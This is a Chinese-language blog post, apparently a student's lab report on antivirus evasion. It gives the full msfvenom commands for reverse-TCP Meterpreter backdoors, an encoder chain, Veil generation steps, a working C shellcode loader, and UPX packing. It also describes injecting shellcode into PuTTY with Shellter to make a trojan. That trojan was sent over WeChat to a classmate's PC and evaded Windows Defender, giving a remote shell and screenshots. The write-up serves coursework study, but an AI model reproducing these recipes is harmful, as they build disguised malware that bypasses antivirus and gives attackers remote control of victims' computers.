<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>第3次实验-免杀原理 - Ethan Chase‘s Site</title><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li-2.html"><link rel="alternate" type="application/atom+xml" href="https://Ethan-Chase.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://Ethan-Chase.github.io/feed.json"><meta property="og:title" content="第3次实验-免杀原理"><meta property="og:site_name" content="Ethan Chase‘s Site"><meta property="og:description" content=""><meta property="og:url" content="https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li-2.html"><meta property="og:type" content="article"><link rel="stylesheet" href="https://Ethan-Chase.github.io/assets/css/style.css?v=6fbb1e8931a5afe843374fd67c192c86"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://Ethan-Chase.github.io/di-3ci-shi-yan-mian-sha-yuan-li-2.html"},"headline":"第3次实验-免杀原理","datePublished":"2024-04-08T16:44","dateModified":"2024-04-08T16:44","description":"","author":{"@type":"Person","name":"Ethan Chase","url":"https://Ethan-Chase.github.io/authors/ethan-chase/"},"publisher":{"@type":"Organization","name":"Ethan Chase"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body><div class="site-container"><header class="top" id="js-header"><a class="logo" href="https://Ethan-Chase.github.io/">Ethan Chase‘s Site</a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li class="has-submenu"><a href="https://Ethan-Chase.github.io/tags/" target="_self" aria-haspopup="true">实验记录</a><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://Ethan-Chase.github.io/tags/wang-luo-dui-kang/" target="_self">网络对抗</a></li></ul></li></ul></nav><div class="search"><div class="search__overlay js-search-overlay"><div class="search__overlay-inner"><button class="search__close js-search-close" aria-label="Close">Close</button></div></div><button class="search__btn js-search-btn" aria-label="Search"><svg role="presentation" focusable="false"><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#search"/></svg></button></div></header><main><article class="post"><div class="hero"><header class="hero__content"><div class="wrapper"><div class="post__meta"><time datetime="2024-04-08T16:44">四月 8, 2024</time></div><h1>第3次实验-免杀原理</h1><div class="post__meta post__meta--author"><a href="https://Ethan-Chase.github.io/authors/ethan-chase/" class="feed__author">Ethan Chase</a></div></div></header></div><div class="wrapper post__entry"><h1 id="第3次实验-免杀原理">第3次实验-免杀原理</h1><h2 id="1基础问题回答">1基础问题回答</h2><h3 id="（1）杀软是如何检测出恶意代码的？">（1）杀软是如何检测出恶意代码的？</h3><p>杀毒软件检测恶意代码的主要方法包括：</p><ul><li><strong>签名检测</strong>：这是最传统的方法，依赖于一个不断更新的恶意软件签名数据库。杀软通过比对文件的特征码（签名）与已知恶意软件的特征码进行匹配来检测恶意代码。</li><li><strong>行为分析</strong>：杀软监控程序的行为，包括对文件、网络、系统资源的访问和修改。如果软件的行为模式与已知的恶意行为模式匹配，则可能被判定为恶意软件。</li><li><strong>启发式分析</strong>：利用启发式算法分析未知软件的行为和代码结构，尝试发现未知的或变种的恶意软件。这种方法不仅仅依赖于已知的恶意软件数据库，而是尝试识别新的威胁。</li><li><strong>沙箱执行</strong>：在一个隔离的环境（沙箱）中执行程序，分析其行为，从而不对实际系统造成影响。如果程序在沙箱中表现出恶意行为，那么它就可能被识别为恶意软件。</li><li><strong>云检测</strong>：借助云计算技术，杀软可以迅速分析大量数据，识别新出现的恶意软件。这种方法可以有效地提高检测的速度和准确性。</li></ul><h3 id="（2）免杀是做什么？">（2）免杀是做什么？</h3><p>免杀是指通过各种技术手段避免恶意软件被杀毒软件检测到的行为。这通常涉及到对恶意软件代码的修改，使其能够绕过安全软件的检测机制，从而在未被发现的情况下在目标系统上执行。</p><h3 id="（3）免杀的基本方法有哪些？">（3）免杀的基本方法有哪些？</h3><h4 id="①改变特征码">①改变特征码</h4><ul><li>加壳</li><li>用encode进行编码</li><li>用其他语言进行重写再编译</li></ul><h4 id="②改变行为">②改变行为</h4><ul><li><p>改变通讯方式</p><ul><li>尽量使用反弹式连接</li><li>使用隧道技术</li><li>加密通讯数据</li></ul></li><li><p>改变操作模式</p><ul><li>基于内存操作</li><li>减少对系统的修改</li></ul></li></ul><h4 id="③非常规方法">③非常规方法</h4><ul><li>使用一个有漏洞的应用当成后门，编写攻击代码集成到如MSF中。</li><li>使用社工类攻击，诱骗目标关闭AV软件。</li><li>纯手工打造一个恶意软件。</li></ul><h3 id="（4）开启杀软能绝对防止电脑中恶意代码吗？">（4）开启杀软能绝对防止电脑中恶意代码吗？</h3><p>开启杀毒软件不能绝对防止电脑中恶意代码的感染。虽然杀软可以大幅度提高安全性，减少恶意软件的威胁，但因为以下原因，它不能提供100%的保护：</p><ul><li>新出现的恶意软件或变种可能还未被安全厂商发现，因此未被加入到签名数据库中。</li><li>免杀技术的发展使得恶意软件能够绕过杀软的检测机制。</li><li>用户的不安全行为，如点击未知链接、下载不安全的附件等，也可能导致安全防护措施被绕过。</li></ul><h2 id="2实验内容">2实验内容</h2><h3 id="20免杀检测网站">2.0免杀检测网站</h3><p>VirusTotal、Virscan</p><ul><li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li><li><a href="http://www.virscan.org/">http://www.virscan.org/</a></li></ul><blockquote><p>本次实验中使用VirusTotal进行检测</p></blockquote><h3 id="21直接使用msf生成的可执行文件进行检测">2.1直接使用msf生成的可执行文件进行检测</h3><p>生成可执行文件</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_1.exe
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042319100.png" alt="image-20240326042319100" data-is-external-image="true"></figure><h3 id="22使用编码器编码编码后再次进行检测">2.2使用编码器编码编码后再次进行检测</h3><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b &#39;\x00&#39; LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_2.exe
</code></pre><p>没有用~</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326042817836.png" alt="image-20240326042817836" data-is-external-image="true"></figure><h3 id="23使用编码器编码编码20次后再次进行检测">2.3使用编码器编码编码20次后再次进行检测</h3><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b &#39;\x00&#39; LHOST=192.168.255.137 LPORT=4325 -f exe &gt; backdoor_4325_3.exe
</code></pre><p>你就说有没有变好吧</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326043020028.png" alt="image-20240326043020028" data-is-external-image="true"></figure><h3 id="24使用veil">2.4使用Veil</h3><h4 id="安装之前最好照个快照，要是哪里不行了可以随时回档！！！">安装之前最好照个快照，要是哪里不行了可以随时回档！！！</h4><blockquote><p>不知道什么是快照的去<a href="https://blog.csdn.net/Dong_Alex/article/details/103547869">VMware虚拟机快照功能_虚拟机恢复快照是什么意思-CSDN博客</a></p></blockquote><p><strong>最理想的情况：</strong></p><p>安装Veil(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)</p><pre><code class="language-shell">sudo apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
</code></pre><blockquote><p>[!NOTE]</p><p>如果卡在这种程序安装的地方的话还是点一下，全部都是默认即可，一路Next到底</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/4cacc6e98c1979b37fb678b63bf89ce.png" alt="4cacc6e98c1979b37fb678b63bf89ce" data-is-external-image="true"></figure></blockquote><p>打开Veil-Evasion</p><pre><code class="language-shell">veil
</code></pre><blockquote><p>使用方法参考博客:<a href="https://blog.csdn.net/qq_41453285/article/details/93538838?ops_request_misc=%7B%22request%5Fid%22%3A%22171140197316800188574575%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=171140197316800188574575&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-93538838-null-null.nonecase&utm_term=veil&spm=1018.2226.3001.4450">Kali——绕过杀毒软件检测工具Veil-Evasion_veil 工具原理-CSDN博客</a></p></blockquote><pre><code class="language-shell">use 1
use 7
set LHOST 192.168.255.137
set LPORT 4325
options
generate
</code></pre><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053010155.png" alt="image-20240326053010155" data-is-external-image="true"></figure><p>好了一点</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326053056315.png" alt="image-20240326053056315" data-is-external-image="true"></figure><p>在windows下运行payload.exe尝试攻击</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328135351722.png" alt="image-20240328135351722" data-is-external-image="true"></figure><p>攻击成功</p><h3 id="25c语言调用">2.5C语言调用</h3><h4 id="第一次攻击失败">第一次攻击——失败</h4><p>先用msf生成一段C语言格式的shellcode数组</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f c &gt; shellcode_win_4325.c
</code></pre><p>在文件中添加</p><pre><code class="language-c">int main()
{
        int (*func)() = (int(*)())buf;
        func();
}
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326054116189.png" alt="image-20240326054116189" data-is-external-image="true"></figure><p>静态编译防止动态连接丢失</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static
</code></pre><p>没有MinGW-w64的可以安装一下:</p><pre><code class="language-shell">sudo apt install mingw-w64
</code></pre><p>另外一种安装方式：</p><p><a href="https://command-not-found.com/i686-w64-mingw32-c++">command-not-found.com – i686-w64-mingw32-c++</a></p><pre><code class="language-shell">apt-get install g++-mingw-w64-i686
</code></pre><p>结果更好了</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240326055049121.png" alt="image-20240326055049121" data-is-external-image="true"></figure><p>尝试攻击</p><pre><code class="language-shell">msfconsole
</code></pre><pre><code class="language-shell">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.255.137
set LPORT 4325
</code></pre><pre><code class="language-shell">options
</code></pre><pre><code class="language-shell">run
</code></pre><p>无法连接</p><h4 id="分析失败原因-by-20214321吴萌源">分析失败原因-by 20214321吴萌源</h4><p>通过对编译后的exe进行debug分析问题所在</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/dbg%E6%89%BE%E5%87%BA%E9%97%AE%E9%A2%98.gif" alt="dbg找出问题" data-is-external-image="true"></figure><p>发现异常后通过文心一言确定问题</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/36f23d9f4397d7f25e75a59bf19562a.png" alt="36f23d9f4397d7f25e75a59bf19562a" data-is-external-image="true"></figure><p>让文心一言给出修改方案</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/70f3be2fe1162626bfc1385bf596b26.png" alt="70f3be2fe1162626bfc1385bf596b26" data-is-external-image="true"></figure><h4 id="第二次攻击成功">第二次攻击——成功</h4><blockquote><p>再次感谢20214321吴萌源同学的帮助</p></blockquote><p>还是先用msf生成一段C语言格式的shellcode数组</p><pre><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.137 LPORT=4325 -f c &gt; shellcode_win_4325.c
</code></pre><p>修改在文件中添加为：</p><pre><code class="language-c">#include &lt;windows.h&gt;  
#include &lt;iostream&gt;  
int main() {  
    // 分配可执行内存  
    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (execMem == NULL) {  
        std::cerr &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl;  
        return 1;  
    }  
   // 复制shellcode到可执行内存  
    memcpy(execMem, buf, sizeof(buf));   
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  
    if (thread == NULL) {  
        std::cerr &lt;&lt; &quot;Thread creation failed!&quot; &lt;&lt; std::endl;  
        VirtualFree(execMem, 0, MEM_RELEASE);  
        return 1;  
    }  
    WaitForSingleObject(thread, INFINITE);  
    CloseHandle(thread);  
    VirtualFree(execMem, 0, MEM_RELEASE);  
    return 0;  
}
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png" alt="image-20240404140410028" data-is-external-image="true"></figure><p>静态编译防止动态连接丢失</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static
</code></pre><p>尝试攻击</p><pre><code class="language-shell">msfconsole
</code></pre><pre><code class="language-shell">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.255.137
set LPORT 4325
</code></pre><pre><code class="language-shell">options
</code></pre><pre><code class="language-shell">run
</code></pre><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140610410.png" alt="image-20240404140610410" data-is-external-image="true"></figure><p>攻击成功！</p><p>最后再给virustotal鉴定一下：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404141200950.png" alt="image-20240404141200950" data-is-external-image="true"></figure><h3 id="26加壳">2.6加壳</h3><h4 id="使用upx对backdoor_20214325exe进行加壳">使用upx对backdoor_20214325.exe进行加壳</h4><pre><code class="language-shell">upx backdoor_20214325.exe -o backdoor_20214325_ups.exe
</code></pre><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/2c787368482691a58ada343863f17b6.png" alt="2c787368482691a58ada343863f17b6" data-is-external-image="true"></figure><p>运行backdoor_20214325_ups.exe后攻击成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328144030424.png" alt="image-20240328144030424" data-is-external-image="true"></figure><p>测一测，比不加壳之前（58/72）好了一点点</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/6d3b5694781debe56a963570beb9332.png" alt="6d3b5694781debe56a963570beb9332" data-is-external-image="true"></figure><h4 id="使用upx对paylodexe进行加壳">使用upx对paylod.exe进行加壳</h4><pre><code class="language-shell">upx paylod.exe -o paylod_upx.exe
</code></pre><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142401115.png" alt="image-20240328142401115" data-is-external-image="true"></figure><p>运行paylod_upx.exe后攻击成功</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142451614.png" alt="image-20240328142451614" data-is-external-image="true"></figure><p>测一下，反向升级了。。。</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240328142707459.png" alt="image-20240328142707459" data-is-external-image="true"></figure><h3 id="27-通过组合应用各种技术实现恶意代码免杀">2.7 通过组合应用各种技术实现恶意代码免杀</h3><p>生成后门软件PuttY_upx.exe，成功与Windows Defender共存，详细见2.8</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png" alt="" data-is-external-image="true"></figure><h3 id="28-附加题：用另一电脑实测，在杀软开启的情况下，可运行并回连成功，注明电脑的杀软名称与版本">2.8 附加题：用另一电脑实测，在杀软开启的情况下，可运行并回连成功，注明电脑的杀软名称与版本</h3><p>使用<a href="https://www.shellterproject.com/introducing-shellter/">Shellter | Shellter (shellterproject.com)</a>向PUTTY.exe注入shellcode后再使用pux进行加壳</p><p>使用微信发送到打开了Windows Defender的<em>20214321吴萌源</em>的电脑上，没有被当成病毒杀掉，成功绕过了的防护</p><p>之前尝试被杀掉的：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/a0eaad7b665b40c15454131502b3cc7.png" alt="a0eaad7b665b40c15454131502b3cc7" data-is-external-image="true"></figure><p>幸存下来的putty_upx.exe：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/3621edfb11518f2f636ae3a2783dbb0.png" alt="3621edfb11518f2f636ae3a2783dbb0" data-is-external-image="true"></figure><p>杀软版本：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/bb813546bcc212148e19e4b7a143ff5.png" alt="bb813546bcc212148e19e4b7a143ff5" data-is-external-image="true"></figure><p>使用快速扫描：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/7c0c5ade859663b19cbfb4557e07768.png" alt="7c0c5ade859663b19cbfb4557e07768" data-is-external-image="true"></figure><p>在运行之后putty_upx.exe之后攻击成功，但是在使用ls命令后后门程序马上就被删除了</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/7571a791881b9534995b80c30d6b046.png" alt="7571a791881b9534995b80c30d6b046" data-is-external-image="true"></figure><p>再次发送putty_upx.exe并重新尝试，在攻击之后文件依然没有被杀软删掉，但是不久之后就显示session died</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/b0c406b36ee60d134b9dfcd21bbaec3.png" alt="b0c406b36ee60d134b9dfcd21bbaec3" data-is-external-image="true"></figure><p>使用screenshot屏幕截图：</p><figure class="post__image"><img src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240330194909289.png" alt="image-20240330194909289" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/4c345e413d7bb5efcb9b117ac3fb90c.png" alt="4c345e413d7bb5efcb9b117ac3fb90c" data-is-external-image="true"></figure><h2 id="3实验总结与体会">3实验总结与体会</h2><p>通过本次实验，我学会了msf中编码器的使用，veil攻击平台的使用、upx加壳等基础的免杀操作，了解了VirusTotal、Virscan等免杀检测网站</p><p>在附加题中，我通过在网上找到的攻击平台Shellter组合加壳的操作实现了初步绕过windows defender的检测，并对在同一局域网下的其他电脑成功发动了攻击</p><h2 id="4遇到的问题与解决方法">4遇到的问题与解决方法</h2><h3 id="41veil安装">4.1Veil安装</h3><p>在第一次安装veil时由于其安装过程较慢，我以为是卡住了，按Ctrl + C打断之后重新安装出错，反复使用apt remove后重新安装依然无法解决，每次都会卡在<code>wine :failed to open L&quot;c:\\windows\\syswow64\\rundll32.exe&quot;: c0000135</code></p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240331110432.png" alt="微信图片_20240331110432" data-is-external-image="true"></figure><p>最后重装kali系统，并直接运行(执行之后就别动了,弹窗什么的它都会自动执行,只用在最后输入密码即可)后解决</p><pre><code class="language-shell">apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
</code></pre><h3 id="42c语言交叉编译">4.2C语言交叉编译</h3><p>使用</p><pre><code class="language-shell">i686-w64-mingw32-g++ shellcode_win_4325.c -o shellcode_win_4325.exe -static-libgcc
</code></pre><p>编译exe后，在windows中运行exe文件后无法成功攻击</p><p>使用</p><pre><code class="language-shell">gcc -m32 -no-pie -fno-pie shellcode_linux_4325.c -o shellcode_linux_4325
</code></pre><p>编译后</p><pre><code class="language-shell">┌──(root㉿kali)-[/home/kali/Desktop]
└─# file shellcode_linux_4325                                               
shellcode_linux_4325: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=38f5903779f6999ff273683ffc071706f17db8f6, for GNU/Linux 3.2.0, not stripped
</code></pre><p>关闭地址随机化，打开堆栈可执行后再次尝试，依然无法解决</p><p>最后在参考<strong>20214321吴萌源</strong>同学的方法后成功攻击</p><p>问题是由于buf中的程序不可执行导致，将文件后添加从</p><pre><code class="language-c">int main()
{
        int (*func)() = (int(*)())buf;
        func();
}
</code></pre><p>替换为即可解决</p><pre><code class="language-c">#include &lt;windows.h&gt;  
#include &lt;iostream&gt;  
int main() {  
    // 分配可执行内存  
    void* execMem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (execMem == NULL) {  
        std::cerr &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl;  
        return 1;  
    }  
   // 复制shellcode到可执行内存  
    memcpy(execMem, buf, sizeof(buf));   
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);  
    if (thread == NULL) {  
        std::cerr &lt;&lt; &quot;Thread creation failed!&quot; &lt;&lt; std::endl;  
        VirtualFree(execMem, 0, MEM_RELEASE);  
        return 1;  
    }  
    WaitForSingleObject(thread, INFINITE);  
    CloseHandle(thread);  
    VirtualFree(execMem, 0, MEM_RELEASE);  
    return 0;  
}
</code></pre><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240404140410028.png" alt="image-20240404140410028" data-is-external-image="true"></figure></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on 四月 8, 2024</p><ul class="post__tag"><li><a href="https://Ethan-Chase.github.io/tags/wang-luo-dui-kang/">网络对抗</a></li></ul><div class="post__share"></div><div class="post__bio bio"><div><h3 class="bio__name"><a href="https://Ethan-Chase.github.io/authors/ethan-chase/" rel="author">Ethan Chase</a></h3></div></div></footer></article><nav class="post__nav"><div class="post__nav-inner"><div class="post__nav-prev"><svg width="1.041em" height="0.416em" aria-hidden="true"><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#arrow-prev"/></svg> <a href="https://Ethan-Chase.github.io/di-2ci-shi-yan-hou-men-yuan-li-yu-shi-jian.html" class="post__nav-link" rel="prev"><span>Previous</span> 第2次实验-后门原理与实践</a></div></div></nav></main><footer class="footer"><div class="footer__copyright"><p>Powered by Publii</p></div><button onclick="backToTopFunction()" id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg><use xlink:href="https://Ethan-Chase.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></footer></div><script defer="defer" src="https://Ethan-Chase.github.io/assets/js/scripts.min.js?v=f47c11534595205f20935f0db2a62a85"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism-autolinker.min.js"></script><script defer="defer" src="https://Ethan-Chase.github.io/media/plugins/syntaxHighlighter/prism-show-invisibles.min.js"></script></body></html>